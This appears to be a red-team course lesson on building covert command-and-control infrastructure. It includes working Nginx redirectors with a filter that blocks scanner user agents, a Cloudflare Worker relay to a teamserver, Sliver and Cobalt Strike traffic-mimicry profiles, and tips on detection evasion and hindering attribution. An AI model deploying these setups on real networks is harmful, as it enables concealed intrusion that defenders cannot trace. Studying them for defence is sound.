---
title: "Advanced C2 Infrastructure Design — Redirectors, Domain Fronting, Malleable Profiles"
tags: [red-team, C2, infrastructure, redirectors, domain-fronting, CDN, malleable-profiles,
  Nginx, Sliver, Cobalt-Strike, OPSEC, ATT&CK, T1090, T1071]
module: 08-RedTeam-03
day: 521
related_topics:
  - Practice Engagement Checkpoint (Day 520)
  - C2 OPSEC (Day 522)
  - C2 Infrastructure Design Basics (Day 492)
  - C2 Lab — Cobalt Strike and Sliver (Day 493)
---

# Day 521 — Advanced C2 Infrastructure Design

> "Your C2 infrastructure is the nervous system of the engagement. If it dies,
> the engagement dies. If it is burned, you burn with it. The goal is not a
> clever C2 — it is a C2 that looks like normal business traffic from every
> vantage point an analyst is likely to check. That takes architecture, not
> just a VPS and a Cobalt Strike licence."
>
> — Ghost

---

## Goals

Design a multi-tier C2 infrastructure with geographic separation and traffic
blending.
Configure Nginx redirectors with valid TLS certificates and traffic filtering.
Understand and implement domain fronting via a CDN (Cloudflare/Fastly).
Build a malleable C2 profile that blends with legitimate SaaS traffic.
Map each infrastructure component to its detection surface.

**Prerequisites:** Day 492 (C2 basics), Day 493 (Sliver/CS lab), Day 519 (evasion),
experience with Linux server administration.
**Time budget:** 5 hours.

---

## Part 1 — Multi-Tier C2 Architecture

```
Single-tier (bad):
  Beacon → Teamserver IP directly
  → If the beacon IP is burned, the teamserver is exposed
  → SOC pivot: "who else talked to this IP?" → all beacons burned

Multi-tier (correct):
  Beacon → Redirector → Teamserver

  Tier 1: Redirector (VPS, cheap, disposable)
    → Receives beacon callbacks
    → Filters traffic: only valid C2 callbacks pass through
    → Invalid traffic → served a legitimate-looking HTTP 200 decoy page
    → Forwards valid callbacks via internal channel to Tier 2

  Tier 2: Short-haul (optional — CDN or second VPS)
    → Another hop to separate the redirector IP from the teamserver

  Tier 3: Teamserver (protected, never directly reachable by beacon)
    → Accepts connections only from Tier 1/2 IP ranges
    → iptables/firewall: all other inbound dropped

Geographic separation:
  Beacon (client site) → Redirector (cloud VPS, different country) →
  Teamserver (cloud VPS, different cloud provider, different country)
  → Attribution requires multiple legal jurisdictions
```

### Infrastructure Checklist Before an Engagement

```
Domain:
  ☐ Domain is at least 3 months old (new domains flag proxies and web filters)
  ☐ Domain has categorised with a reputable web proxy category
    (business/technology/SaaS, not "uncategorised")
  ☐ Domain has a real-looking web page served at the root (/).
  ☐ Valid TLS certificate from Let's Encrypt or a commercial CA
  ☐ WHOIS privacy enabled; registered with valid registrant info (or privacy)
  ☐ SPF/DKIM/DMARC configured if used for phishing infrastructure

Redirector VPS:
  ☐ Different cloud provider than the teamserver
  ☐ Nginx installed with TLS termination (Let's Encrypt certbot)
  ☐ Nginx config: only known callback paths forwarded to teamserver
  ☐ All other paths: serve a decoy HTML page (200 OK, not a 301 or 5xx)
  ☐ Teamserver IP is ONLY in the Nginx config, never in DNS
  ☐ Logging disabled on the redirector (no access logs with source IPs)

Teamserver:
  ☐ iptables DROP all inbound except from redirector IPs and operator IPs
  ☐ Listening only on localhost for operator connections (SSH tunnel to operate)
  ☐ No public-facing ports except via SSH tunnel
  ☐ Firewall hardware rules at the cloud provider level (security groups)
```

---

## Part 2 — Nginx Redirector Configuration

### Basic Redirector Setup

```nginx
# /etc/nginx/sites-available/c2-redirector

server {
    listen 443 ssl;
    server_name cdn-cache.example.com;

    ssl_certificate     /etc/letsencrypt/live/cdn-cache.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-cache.example.com/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    # C2 callback path — forwarded to teamserver
    # Path must match the malleable profile's URI
    location /api/v2/stats {
        proxy_pass          https://TEAMSERVER_IP:443;
        proxy_ssl_verify    off;
        proxy_set_header    Host $host;
        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Catch-all — any non-C2 path gets the decoy page
    location / {
        root /var/www/decoy;
        index index.html;
        try_files $uri $uri/ =200;
    }
}

server {
    listen 80;
    server_name cdn-cache.example.com;
    return 301 https://$host$request_uri;
}
```

### Traffic Filtering — Block Analyst Probes

```nginx
# Add to the C2 location block to filter out scanners and analysts:

location /api/v2/stats {
    # Block common security scanner User-Agents:
    if ($http_user_agent ~* "curl|wget|python|scanner|masscan|nmap|shodan") {
        return 404;
    }

    # Only forward if the request has the correct C2 header or content-type:
    # (Match what the malleable profile sends)
    if ($http_content_type != "application/octet-stream") {
        return 404;
    }

    proxy_pass          https://TEAMSERVER_IP:443;
    proxy_ssl_verify    off;
    proxy_set_header    Host $host;
}

# Block common IP ranges from cloud security providers (Cloudflare, VirusTotal scanners):
# Maintain a geo-block or IP range block list if needed
# deny 104.16.0.0/12;   # Cloudflare scanning ranges
```

---

## Part 3 — Domain Fronting

### What Domain Fronting Is

```
Domain fronting uses a CDN to relay C2 traffic through a trusted, high-reputation
domain. The TLS SNI field (visible to network monitors) shows a legitimate CDN
domain; the HTTP Host header (inside the TLS tunnel, invisible) routes the
request to the attacker's origin.

Classic domain fronting:
  Beacon → TLS to *.azurefd.net (legitimate Microsoft Azure Front Door CDN)
  SNI = legitimate-app.azurefd.net (what the firewall/proxy sees)
  HTTP Host header inside TLS = attacker.azurefd.net (routes to attacker origin)
  → Network monitor sees: "connection to Microsoft Azure" → allowed
  → Traffic arrives at attacker C2 inside a Microsoft CDN tunnel

Current state (2024):
  → Azure Front Door, Cloudflare, and AWS CloudFront have closed traditional
    domain fronting by enforcing Host header matching
  → "Domain hiding" via Cloudflare Workers remains viable:
    Workers can be used as a transparent proxy to your C2 origin
  → Fastly and some GCP load balancers still allow limited fronting
  → meek (Tor pluggable transport) is the most reliable domain fronting-adjacent
    technique for adversarial environments

Lab implementation (Cloudflare Workers):
```

### Cloudflare Worker C2 Relay

```javascript
// Cloudflare Worker — acts as a transparent relay to the C2 teamserver
// Deployed at: c2-relay.your-domain.workers.dev
// Worker runs on Cloudflare's global edge → IP = Cloudflare IP = trusted

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const TEAMSERVER = 'https://YOUR_TEAMSERVER_OR_REDIRECTOR_IP'
  const CALLBACK_PATH = '/api/v2/stats'
  const url = new URL(request.url)

  // Only relay the specific C2 callback path
  if (url.pathname === CALLBACK_PATH) {
    const proxyRequest = new Request(TEAMSERVER + url.pathname + url.search, {
      method: request.method,
      headers: request.headers,
      body: request.body
    })
    return fetch(proxyRequest)
  }

  // All other paths: return a decoy response
  return new Response('OK', { status: 200 })
}

// Beacon configuration:
//   C2 host: c2-relay.your-domain.workers.dev
//   From the network: traffic goes to Cloudflare IP (1.1.1.1 range)
//   Firewall rules for "block suspicious domains" won't match *.workers.dev
//   Most enterprise proxies whitelist Cloudflare entirely
```

---

## Part 4 — Malleable C2 Profiles

### Purpose of Malleable Profiles

```
Malleable profiles control every aspect of how beacon traffic looks on the wire:
  → HTTP verb and URI used for check-in
  → HTTP headers present on each request/response
  → How the payload (command output) is encoded and where it appears
    (in the URL, a header, the body)
  → Jitter: how much randomness is applied to the sleep interval
  → SSL certificate details

Goal: make C2 traffic indistinguishable from a known, legitimate SaaS application
(e.g. Microsoft Office 365 sync traffic, Google Analytics beacon, Zoom heartbeat).
```

### Sliver Malleable Profile — Mimicking Office 365

```
# Sliver supports C2 profiles via implant configuration
# Define custom headers and URIs at implant build time:

sliver > generate --http cdn-cache.example.com \
    --os windows \
    --arch amd64 \
    --format exe \
    --name beacon \
    --jitter 15 \
    --reconnect 60

# Sliver HTTP implant configuration (sliver-server config):
# /etc/sliver/configs/http-c2.yaml

# Customize the HTTP request to look like Office 365 telemetry:
```

```yaml
# sliver HTTP C2 profile — Office 365 telemetry mimicry
poll_timeout: 90s
long_poll_timeout: 90s
long_poll_jitter: 30s

implant_config:
  headers:
    - name: "User-Agent"
      value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
              (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    - name: "Accept"
      value: "application/json, text/plain, */*"
    - name: "Accept-Language"
      value: "en-US,en;q=0.9"
    - name: "Origin"
      value: "https://outlook.office365.com"
    - name: "Referer"
      value: "https://outlook.office365.com/mail/"
    - name: "X-Request-ID"
      value: "{{uuid}}"                  # dynamic per-request UUID
    - name: "client-request-id"
      value: "{{uuid}}"                  # Microsoft-style correlation header
  urls:
    - "/api/v2/olk/stats"
    - "/api/v2/olk/sync"
    - "/api/v2/olk/pulse"
  stager_url: "/api/v2/olk/bootstrap"
```

### Cobalt Strike Malleable Profile — Amazon Browse Traffic

```c
# amazon.profile excerpt (Cobalt Strike format):
set sleeptime "60000";   # 60 second sleep
set jitter    "15";      # ±15% jitter
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
               (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";

    client {
        header "Accept" "*/*";
        header "Host" "www.amazon.com";

        metadata {
            base64url;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "text/html;charset=UTF-8";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRqVk==";
        header "X-Frame-Options" "SAMEORIGIN";
        header "Server" "Server";

        output {
            base64url;
            prepend "116-3614625-5765421?nodeId=1248232011";
            append "&ref_=cbl_pl_a1";
            print;
        }
    }
}
```

---

## Part 5 — Detection Surface per Component

| Component | What it looks like to a defender | Detection signal |
|---|---|---|
| Redirector VPS | Web server with Let's Encrypt cert, low traffic | New domain <30 days old; uncategorised domain; no search engine presence |
| Nginx redirect + proxy | HTTP proxy forwarding for a subset of paths | Proxy log: upstream connection to non-CDN IP for a "CDN" hostname |
| Cloudflare Worker relay | Traffic to *.workers.dev or *.pages.dev | DNS query to workers.dev from a workstation; beaconing intervals to same edge IP |
| Malleable Office 365 profile | HTTP to non-Microsoft IP with Office headers | TLS fingerprint (JA3) mismatch vs real Edge browser; Origin header without matching Referer; non-Microsoft cert on "outlook.office365.com" host |
| Beacon sleep interval | Periodic outbound HTTP at regular intervals | Beacon interval analysis: N connections/hour ± small jitter; no human browsing variability |

### JA3/JA3S TLS Fingerprinting

```
JA3: a fingerprint of the TLS ClientHello parameters
  → TLS version, cipher suites, extensions, elliptic curves, point formats
  → Produced by the client (beacon), not the server
  → Same binary = same JA3 fingerprint regardless of C2 domain

Problem:
  Cobalt Strike's default JA3 fingerprint is publicly known and blocklisted
  in most commercial NGFWs (Palo Alto, Fortinet, etc.)

Fix:
  1. Use a custom TLS configuration in the C2 implant that matches a real
     browser's JA3 (Chrome, Edge)
  2. Sliver: built-in JA3 randomisation per implant build
  3. Cobalt Strike: use a custom sleep mask and sleep kit that modifies the
     TLS stack before each connection
  4. Verify your JA3 with: ja3er.com or run wireshark → tshark -r capture.pcap
     -T fields -e tls.handshake.ja3
```

---

## Key Takeaways

1. The redirector is the single most important OPSEC component. It decouples the
   teamserver from the client network. If a redirector IP is burned and blocklisted,
   rotate it — the teamserver and all other beacons continue to function via other
   redirectors.
2. Domain age and categorisation defeat most enterprise web proxies. A domain
   registered the day before the engagement will be flagged as "new/uncategorised"
   by Zscaler, Bluecoat, and most web filtering products. Register domains weeks
   in advance and seed them with legitimate-looking content.
3. Domain fronting via cloud CDN is the highest-trust channel available. Defenders
   cannot block *.workers.dev without breaking large amounts of legitimate
   Cloudflare-hosted content. This is asymmetric — the defender's cost of blocking
   is higher than the attacker's cost of using it.
4. Malleable profile quality is directly correlated with dwell time. A beacon that
   looks like Office 365 telemetry from Chrome on Windows 10 will survive in an
   environment for months. A beacon with the default CS profile will be caught by a
   basic IDS in hours.
5. Beacon interval analysis is the most reliable long-term detection method for
   any C2 that uses regular check-ins. Jitter (±15–30%) is not enough to defeat
   statistical beacon detection. Use long-poll with variable sleep and human-hours
   scheduling (no callbacks at 3 a.m.) for maximum dwell time.

---

## Exercises

1. Stand up a Nginx redirector on a lab VPS. Configure it to forward only
   requests to `/api/v2/stats` to your Sliver teamserver, and return a real
   HTML page for all other paths. Verify with `curl -v` that the decoy page is
   returned for arbitrary paths and that the C2 path responds with your implant
   callback.
2. Deploy a Cloudflare Worker that relays traffic to your lab redirector. Build
   a Sliver implant pointing to the Workers URL. Verify that Zeek network logs
   show the connection going to a Cloudflare IP, not your VPS IP.
3. Write a Sliver HTTP C2 profile YAML that mimics Google Analytics beacon
   traffic (path: `/collect`, headers: GA measurement protocol style). Test it
   with a lab implant and inspect the traffic with Wireshark. Does it look like
   GA traffic to a non-expert analyst?
4. Capture a C2 beacon session with Wireshark. Extract the JA3 fingerprint
   using tshark. Compare it to the JA3 fingerprint of a real Chrome browser
   making HTTPS requests. What differs? What would you change in the implant
   TLS configuration to make them match?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q521.1, Q521.2 …).

---

## Navigation

← Previous: [Day 520 — Practice Engagement Checkpoint](DAY-0520-Practice-Engagement-Checkpoint.md)
→ Next: [Day 522 — C2 OPSEC and Operational Security](DAY-0522-C2-OPSEC.md)
